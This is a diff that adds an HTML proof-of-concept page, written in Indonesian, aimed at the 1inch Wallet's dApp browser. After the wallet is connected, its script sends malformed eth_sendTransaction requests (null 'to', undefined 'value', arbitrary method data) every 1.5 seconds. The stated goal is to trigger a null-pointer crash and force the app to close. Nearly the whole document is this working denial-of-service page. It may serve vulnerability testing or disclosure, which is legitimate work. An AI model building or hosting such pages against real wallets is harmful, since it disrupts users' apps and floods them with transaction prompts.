@@ -1,0 +1,164 @@
+     <!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>1inch Wallet Local DoS PoC</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+            padding: 20px;
+            background-color: #0d1117;
+            color: #c9d1d9;
+            text-align: center;
+        }
+        .btn {
+            background-color: #1f6feb;
+            color: #ffffff;
+            border: 1px solid rgba(240,246,252,0.1);
+            padding: 14px 28px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 6px;
+            cursor: pointer;
+            margin: 10px;
+            width: 100%;
+            max-width: 320px;
+            transition: 0.2s;
+        }
+        .btn:disabled {
+            background-color: #21262d;
+            color: #8b949e;
+            cursor: not-allowed;
+        }
+        #stopBtn { background-color: #da3633; }
+        #logContainer {
+            margin-top: 20px;
+            padding: 15px;
+            background-color: #161b22;
+            border-radius: 6px;
+            border: 1px solid #30363d;
+            text-align: left;
+            max-height: 300px;
+            overflow-y: auto;
+            font-family: monospace;
+            font-size: 13px;
+        }
+        .success { color: #58a6ff; }
+        .crash-trigger { color: #f85149; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+    <h2>1inch Wallet - Fuzzing & Crash Test PoC</h2>
+    <p>PoC ini dirancang untuk menguji ketahanan penanganan kesalahan (Error Handling) pada dApp Browser EVM.</p>
+
+    <button id="connectBtn" class="btn">1. Hubungkan 1inch Wallet</button>
+    <br>
+    <button id="startFuzzBtn" class="btn" disabled>2. Picu Loop Null Pointer (Spam)</button>
+    <br>
+    <button id="stopBtn" class="btn" disabled>Hentikan Pengujian</button>
+
+    <h3>Log Konsol Eksekusi:</h3>
+    <div id="logContainer">Menunggu interaksi pengguna...</div>
+
+    <script>
+        let walletAddress = null;
+        let fuzzInterval = null;
+        let requestCount = 0;
+
+        const logContainer = document.getElementById('logContainer');
+        const connectBtn = document.getElementById('connectBtn');
+        const startFuzzBtn = document.getElementById('startFuzzBtn');
+        const stopBtn = document.getElementById('stopBtn');
+
+        function writeLog(text, className = '') {
+            const now = new Date().toLocaleTimeString();
+            const logLine = `<div class="${className}">[${now}] ${text}</div>`;
+            logContainer.innerHTML = logLine + logContainer.innerHTML;
+        }
+
+        // 1. Deteksi awal status Provider Web3
+        window.addEventListener('load', () => {
+            if (typeof window.ethereum !== 'undefined') {
+                writeLog("Web3 Provider (window.ethereum) terdeteksi. Siap dihubungkan.", "success");
+            } else {
+                writeLog("Provider tidak ditemukan. Pastikan dibuka di dalam dApp Browser 1inch.", "crash-trigger");
+            }
+        });
+
+        // 2. Fungsi untuk Request Account (Koneksi Dompet)
+        connectBtn.addEventListener('click', async () => {
+            if (typeof window.ethereum === 'undefined') {
+                alert("Buka halaman ini di dalam dApp Browser dompet kripto Anda.");
+                return;
+            }
+
+            try {
+                writeLog("Meminta akses akun ke dompet...");
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                
+                if (accounts && accounts.length > 0) {
+                    walletAddress = accounts[0];
+                    writeLog(`Berhasil terhubung! Alamat: ${walletAddress}`, "success");
+                    startFuzzBtn.disabled = false;
+                }
+            } catch (error) {
+                writeLog(`Koneksi ditolak atau gagal: ${error.message}`, "crash-trigger");
+            }
+        });
+
+        // 3. Fungsi Inti: Fuzzing Payload untuk Memicu Null Pointer Exception
+        startFuzzBtn.addEventListener('click', () => {
+            writeLog("Memulai pemboman RPC Request (Interval: 1.5 detik)...", "crash-trigger");
+            startFuzzBtn.disabled = true;
+            stopBtn.disabled = false;
+
+            fuzzInterval = setInterval(async () => {
+                requestCount++;
+                writeLog(`Mengirim Payload Fuzzing #${requestCount}...`);
+
+                try {
+                    /* STRATEGI CRASH EVM:
+                       Mengirim parameter transaksi yang sengaja dirusak (Malformed Data).
+                       Kita mengirimkan objek kosong, atau parameter esensial seperti 
+                       'to' atau 'value' bernilai null / tipe data yang salah.
+                    */
+                    const malformedTxParams = {
+                        from: walletAddress,
+                        to: null,             // Sengaja dilewatkan sebagai null untuk memicu Null Pointer
+                        value: undefined,     // Tidak diinisialisasi
+                        gas: "0x5510",
+                        data: "0x095ea3b3"    // Method ID acak
+                    };
+
+                    // Menggunakan metode standar EVM untuk mengirim transaksi
+                    await window.ethereum.request({
+                        method: 'eth_sendTransaction',
+                        params: [malformedTxParams],
+                    });
+
+                    writeLog(`Respon #${requestCount}: Wallet merespons (Tidak Crash).`);
+                } catch (error) {
+                    /* Jika dompet memiliki error handling yang baik, ia akan melempar catch error ke sini.
+                       Namun jika dompet mengalami Null Pointer Exception di native code-nya,
+                       aplikasi akan langsung FORCE CLOSE sebelum sempat mengeksekusi blok catch ini.
+                    */
+                    writeLog(`Respon #${requestCount} ditolak aman: ${error.message}`);
+                }
+            }, 1500); // Kecepatan dipercepat menjadi 1.5 detik untuk intensitas stress-test
+        });
+
+        // 4. Menghentikan Fuzzing secara manual
+        stopBtn.addEventListener('click', () => {
+            if (fuzzInterval) {
+                clearInterval(fuzzInterval);
+                writeLog("Pengujian dihentikan.");
+                startFuzzBtn.disabled = false;
+                stopBtn.disabled = true;
+            }
+        });
+    </script>
+</body>
+</html>
+
